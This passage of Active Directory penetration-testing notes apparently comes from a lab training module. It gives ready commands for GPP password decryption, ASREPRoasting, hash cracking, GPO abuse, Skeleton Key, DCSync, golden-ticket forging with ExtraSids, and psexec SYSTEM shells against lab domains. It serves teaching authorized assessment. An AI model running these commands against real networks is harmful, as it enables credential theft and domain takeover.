These files can contain an array of configuration data and defined passwords. The `cpassword` attribute value is AES-256 bit encrypted, but Microsoft [published the AES private key on MSDN](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN), which can be used to decrypt the password. Any domain user can read these files as they are stored on the SYSVOL share, and all authenticated users in a domain, by default, have read access to this domain controller share.

This was patched in 2014 [MS14-025 Vulnerability in GPP could allow elevation of privilege](https://support.microsoft.com/en-us/topic/ms14-025-vulnerability-in-group-policy-preferences-could-allow-elevation-of-privilege-may-13-2014-60734e15-af79-26ca-ea53-8cd617073c30), to prevent administrators from setting passwords using GPP. The patch does not remove existing Groups.xml files with passwords from SYSVOL. If you delete the GPP policy instead of unlinking it from the OU, the cached copy on the local computer remains.

The XML looks like the following:

**Viewing Groups.xml**

![image](https://academy.hackthebox.com/storage/modules/143/GPP.png)

If you retrieve the cpassword value more manually, the `gpp-decrypt` utility can be used to decrypt the password as follows:

**Decrypting the Password with gpp-decrypt**

```shell
gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE
```

GPP passwords can be located by searching or manually browsing the SYSVOL share or using tools such as [Get-GPPPassword.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1), the GPP Metasploit Post Module, and other Python/Ruby scripts which will locate the GPP and return the decrypted cpassword value. CrackMapExec also has two modules for locating and retrieving GPP passwords. One quick tip to consider during engagements: Often, GPP passwords are defined for legacy accounts, and you may therefore retrieve and decrypt the password for a locked or deleted account. However, it is worth attempting to password spray internally with this password (especially if it is unique). Password re-use is widespread, and the GPP password combined with password spraying could result in further access.

**Locating & Retrieving GPP Passwords with CrackMapExec**

```shell
nxc smb -L | grep gpp
```

It is also possible to find passwords in files such as Registry.xml when autologon is configured via Group Policy. This may be set up for any number of reasons for a machine to automatically log in at boot. If this is set via Group Policy and not locally on the host, then anyone on the domain can retrieve credentials stored in the Registry.xml file created for this purpose. This is a separate issue from GPP passwords as Microsoft has not taken any action to block storing these credentials on the SYSVOL in cleartext and, hence, are readable by any authenticated user in the domain. We can hunt for this using CrackMapExec with the [gpp_autologin](https://www.infosecmatter.com/crackmapexec-module-library/?cmem=smb-gpp_autologin) module, or using the [Get-GPPAutologon.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPAutologon.ps1) script included in PowerSploit.

**Using CrackMapExec's gpp_autologin Module**

```shell
nxc smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
```

### ASREPRoasting

It's possible to obtain the Ticket Granting Ticket (TGT) for any account that has the [Do not require Kerberos pre-authentication](https://www.tenable.com/blog/how-to-stop-the-kerberos-pre-authentication-attack-in-active-directory) setting enabled. Many vendor installation guides specify that their service account be configured in this way. The authentication service reply (AS_REP) is encrypted with the account’s password, and any domain user can request it.

If an account has pre-authentication disabled, an attacker can request authentication data for the affected account and retrieve an encrypted TGT from the Domain Controller. This can be subjected to an offline password attack using a tool such as Hashcat or John the Ripper.

ASREPRoasting is similar to Kerberoasting, but it involves attacking the AS-REP instead of the TGS-REP. An SPN is not required. This setting can be enumerated with PowerView or built-in tools such as the PowerShell AD module.

The attack itself can be performed with the [Rubeus](https://github.com/GhostPack/Rubeus) toolkit and other tools to obtain the ticket for the target account. If an attacker has `GenericWrite` or `GenericAll` permissions over an account, they can enable this attribute and obtain the AS-REP ticket for offline cracking to recover the account's password before disabling the attribute again. Like Kerberoasting, the success of this attack depends on the account having a relatively weak password.

**Enumerating for DONT_REQ_PREAUTH Value using Get-DomainUser**

```powershell
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
```

**Retrieving AS-REP in Proper Format using Rubeus**

```powershell
.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
```

**Retrieving the AS-REP Using Kerbrute**

```shell
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
```

**GetNPUsers.py**

```shell
GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users 
```

**Cracking the Hash Offline with Hashcat**

```shell
hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt 
```

### Group Policy Object (GPO) Abuse

GPO misconfigurations can be abused to perform the following attacks:

- Adding additional rights to a user (such as SeDebugPrivilege, SeTakeOwnershipPrivilege, or SeImpersonatePrivilege)
- Adding a local admin user to one or more hosts
- Creating an immediate scheduled task to perform any number of actions

We can enumerate GPO information using many of the tools we've been using throughout this module such as PowerView and BloodHound. We can also use [group3r](https://github.com/Group3r/Group3r), [ADRecon](https://github.com/sense-of-security/ADRecon), [PingCastle](https://www.pingcastle.com/), among others, to audit the security of GPOs in a domain.

Using the [Get-DomainGPO](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainGPO) function from PowerView, we can get a listing of GPOs by name.

**Enumerating GPO Names with PowerView**

```powershell
Get-DomainGPO |select displayname
```

**Enumerating GPO Names with a Built-In Cmdlet**

```powershell
Get-GPO -All | Select DisplayName
```

**Enumerating Domain User GPO Rights**

```powershell
PS C:\htb> $sid=Convert-NameToSid "Domain Users"
PS C:\htb> Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}
```

**Converting GPO GUID to Name**

```powershell
Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532
```

We could use a tool such as [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) to take advantage of this GPO misconfiguration by performing actions such as adding a user that we control to the local admins group on one of the affected hosts, creating an immediate scheduled task on one of the hosts to give us a reverse shell, or configure a malicious computer startup script to provide us with a reverse shell or similar. When using a tool like this, we need to be careful because commands can be run that affect every computer within the OU that the GPO is linked to. If we found an editable GPO that applies to an OU with 1,000 computers, we would not want to make the mistake of adding ourselves as a local admin to that many hosts. Some of the attack options available with this tool allow us to specify a target user or host. The hosts shown in the above image are not exploitable, and GPO attacks will be covered in-depth in a later module.

## Onwards

We have seen various misconfigurations that we may run into during an assessment, and there are many more that will be covered in more advanced Active Directory modules. It is worth familiarizing ourselves with as many attacks as possible, so we recommend doing some research on topics such as:

- Active Directory Certificate Services (AD CS) attacks
- Kerberos Constrained Delegation
- Kerberos Unconstrained Delegation
- Kerberos Resource-Based Constrained Delegation (RBCD)

## Skeleton Key Attack

The **Skeleton Key attack** is a sophisticated technique that allows attackers to **bypass Active Directory authentication** by **injecting a master password** into the domain controller. This enables the attacker to **authenticate as any user** without their password, effectively **granting them unrestricted access** to the domain.

It can be performed using [Mimikatz](https://github.com/gentilkiwi/mimikatz). To carry out this attack, **Domain Admin rights are prerequisite**, and the attacker must target each domain controller to ensure a comprehensive breach. However, the attack's effect is temporary, as **restarting the domain controller eradicates the malware**, necessitating a reimplementation for sustained access.

**Executing the attack** requires a single command: `misc::skeleton`.

# Domain Trusts Primer

Types of trust:

- `Parent-child`: Two or more domains within the same forest. The child domain has a two-way transitive trust with the parent domain, meaning that users in the child domain `corp.inlanefreight.local` could authenticate into the parent domain `inlanefreight.local`, and vice-versa.
- `Cross-link`: A trust between child domains to speed up authentication.
- `External`: A non-transitive trust between two separate domains in separate forests which are not already joined by a forest trust. This type of trust utilizes [SID filtering](https://www.serverbrain.org/active-directory-2008/sid-history-and-sid-filtering.html) or filters out authentication requests (by SID) not from the trusted domain.
- `Tree-root`: A two-way transitive trust between a forest root domain and a new tree root domain. They are created by design when you set up a new tree root domain within a forest.
- `Forest`: A transitive trust between two forest root domains.
- [ESAE](https://docs.microsoft.com/en-us/security/compass/esae-retirement): A bastion forest used to manage Active Directory.

Trusts can be transitive or non-transitive.

- A `transitive` trust means that trust is extended to objects that the child domain trusts. For example, let's say we have three domains. In a transitive relationship, if `Domain A` has a trust with `Domain B`, and `Domain B` has a `transitive` trust with `Domain C`, then `Domain A` will automatically trust `Domain C`.
- In a `non-transitive trust`, the child domain itself is the only one trusted.

## Enumerating Trust Relationships

Using Get-ADTrust

```powershell
PS C:\htb> Import-Module activedirectory
PS C:\htb> Get-ADTrust -Filter *
```

Checking for Existing Trusts using Powerview

```powershell
Get-DomainTrust
```

```powershell
Get-DomainTrustMapping
```

```powershell
Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName
```

Using netdom to query domain trust

```shell
netdom query /domain:inlanefreight.local trust
```

Using netdom to query domain controllers

```shell
netdom query /domain:inlanefreight.local dc
```

Using netdom to query workstations and servers

```shell
netdom query /domain:inlanefreight.local workstation
```

## Attacking Domain Trusts - Child -> Parent Trusts - from Windows

**SID History Primer**: 

The `sidHistory` attribute is used during domain migrations to maintain access to resources by storing the original Security Identifier (SID) in the new domain account.

Attackers can exploit this by injecting a SID into the `sidHistory` of an account they control, potentially granting them elevated privileges, such as Domain Admin access, allowing them to perform actions like DCSync or create a Golden Ticket for persistent access.

**ExtraSids Attack**:

This attack targets parent domains after compromising a child domain within the same Active Directory (AD) forest, exploiting the lack of SID Filtering.

By setting the `sidHistory` of a user in the child domain to include the SID of the Enterprise Admins group from the parent domain, attackers can gain administrative access to the entire forest.

The attack requires specific data:
- KRBTGT hash
- child domain's SID
- a target user name
- child domain's FQDN
- Enterprise Admins group's SID.

**Mimikatz**

Obtaining the KRBTGT Account's NT Hash using Mimikatz

```powershell
lsadump::dcsync /user:LOGISTICS\krbtgt
```

Obtaining Enterprise Admins Group's SID using Get-DomainGroup

```powershell
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
```

Creating a Golden Ticket with Mimikatz

```powershell
kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
```

Confirming a Kerberos Ticket is in Memory Using klist

```powershell
PS C:\htb> klist

Current LogonId is 0:0xf6462

Cached Tickets: (1)

#0>     Client: hacker @ LOGISTICS.INLANEFREIGHT.LOCAL
        Server: krbtgt/LOGISTICS.INLANEFREIGHT.LOCAL @ LOGISTICS.INLANEFREIGHT.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
        Start Time: 3/28/2022 19:59:50 (local)
        End Time:   3/25/2032 19:59:50 (local)
        Renew Time: 3/25/2032 19:59:50 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

**Rubeus**

Creating a Golden Ticket using Rubeus

```powershell
.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
```

## Attacking Domain Trusts - Child -> Parent Trusts - from Linux

Performing DCSync with secretsdump.py

```shell
secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
```

Performing SID Brute Forcing using lookupsid.py (Impacket)

```shell
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"
```

Grabbing the Domain SID & Attaching to Enterprise Admin's RID

```shell
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"
```

Constructing a Golden Ticket using ticketer.py

```shell
ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
```

Setting the KRB5CCNAME Environment Variable

```shell
export KRB5CCNAME=hacker.ccache
```

Getting a SYSTEM shell using Impacket's psexec.py

```shell
psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
```

AUTOMATION: Performing the Attack with raiseChild.py

```shell
raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
```

## Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows

### Cross-Forest Kerberoasting

Enumerating Accounts for Associated SPNs Using Get-DomainUser

```powershell
Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
```

Enumerating the mssqlsvc Account

```powershell
Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof
```

Let's perform a Kerberoasting attack across the trust using `Rubeus`. We run the tool as we did in the Kerberoasting section, but we include the `/domain:` flag and specify the target domain.

Performing a Kerberoasting Attacking with Rubeus Using /domain Flag

```powershell
.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
```

## Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux

As we saw in the previous section, it is often possible to Kerberoast across a forest trust. If this is possible in the environment we are assessing, we can perform this with `GetUserSPNs.py` from our Linux attack host. To do this, we need credentials for a user that can authenticate into the other domain and specify the `-target-domain` flag in our command.

Using GetUserSPNs.py

```shell
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
```

Using the -request Flag

```shell
GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley  
```

We could then attempt to crack this offline using Hashcat with mode `13100`. If successful, we'd be able to authenticate into the `FREIGHTLOGISTICS.LOCAL` domain as a Domain Admin.

# Additional AD Auditing Techniques

## Creating an AD Snapshot with Active Directory Explorer

[AD Explorer](https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer) is part of the Sysinternal Suite and is described as:

"An advanced Active Directory (AD) viewer and editor. You can use AD Explorer to navigate an AD database easily, define favorite locations, view object properties, and attributes without opening dialog boxes, edit permissions, view an object's schema, and execute sophisticated searches that you can save and re-execute."

## PingCastle

[PingCastle](https://www.pingcastle.com/documentation/) is a powerful tool that evaluates the security posture of an AD environment and provides us the results in several different maps and graphs. Thinking about security for a second, if you do not have an active inventory of the hosts in your enterprise, PingCastle can be a great resource to help you gather one in a nice user-readable map of the domain. PingCastle is different from tools such as PowerView and BloodHound because, aside from providing us with enumeration data that can inform our attacks, it also provides a detailed report of the target domain's security level using a methodology based on a risk assessment/maturity framework. The scoring shown in the report is based on the [Capability Maturity Model Integration](https://en.wikipedia.org/wiki/Capability_Maturity_Model_Integration) (CMMI).

## Group3r

[Group3r](https://github.com/Group3r/Group3r) is a tool purpose-built to find vulnerabilities in Active Directory associated Group Policy. Group3r must be run from a domain-joined host with a domain user (it does not need to be an administrator), or in the context of a domain user (i.e., using `runas /netonly`).

```shell
group3r.exe -f <filepath-name.log> 
```

When running Group3r, we must specify the `-s` or the `-f` flag. These will specify whether to send results to stdout (-s), or to the file we want to send the results to (-f). For more options and usage information, utilize the `-h` flag, or check out the usage info at the link above.

## ADRecon

Finally, there are several other tools out there that are useful for gathering a large amount of data from AD at once. In an assessment where stealth is not required, it is also worth running a tool like [ADRecon](https://github.com/adrecon/ADRecon) and analyzing the results, just in case all of our enumeration missed something minor that may be useful to us or worth pointing out to our client.